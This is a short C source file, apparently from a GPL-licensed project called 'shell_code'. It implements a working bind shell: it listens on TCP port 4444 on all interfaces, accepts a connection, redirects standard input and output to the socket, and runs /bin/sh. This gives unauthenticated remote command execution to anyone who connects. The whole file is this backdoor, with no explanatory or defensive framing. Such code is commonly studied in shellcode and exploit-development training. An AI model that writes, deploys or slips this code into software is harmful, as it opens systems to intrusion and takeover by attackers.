#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
/*
This file is part of shell_code.

    shell_code is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License.

    shell_code is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with shell_code.  If not, see <http://www.gnu.org/licenses/>.
*/ 
int main(void)
{
        int clientfd, sockfd;
        int dstport = 4444;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
        mysockaddr.sin_family = AF_INET;
        mysockaddr.sin_port = htons(dstport);
        mysockaddr.sin_addr.s_addr = INADDR_ANY;
 
        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
 
        listen(sockfd, 0);
 
        clientfd = accept(sockfd, NULL, NULL);
 
        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}